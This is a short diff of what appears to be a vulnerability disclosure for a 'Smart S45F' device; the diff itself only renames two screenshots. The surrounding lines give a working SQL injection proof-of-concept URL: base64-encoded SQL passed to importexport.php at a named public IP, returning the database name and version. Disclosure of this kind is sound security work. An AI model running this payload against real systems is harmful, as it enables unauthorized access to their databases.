@@ -12,11 +12,11 @@ Smart S45F
 
 ## 4. Vulnerability Reproduction:
 IP: https://103.121.164.62:8443/
-![image-bz1](images/bz1.png)
+![image-bz1](images/smart1.png)
 
 As shown in the login interface.
 
 Construct POC, successfully obtaining the database name and version:
 https://103.121.164.62:8443/importexport.php?sql=c2VsZWN0IDEsZGF0YWJhc2UoKSx2ZXJzaW9uKCk=&type=exportexcelbysql
 
-![image-bz2](images/bz2.png)
+![image-bz2](images/smart2.png)
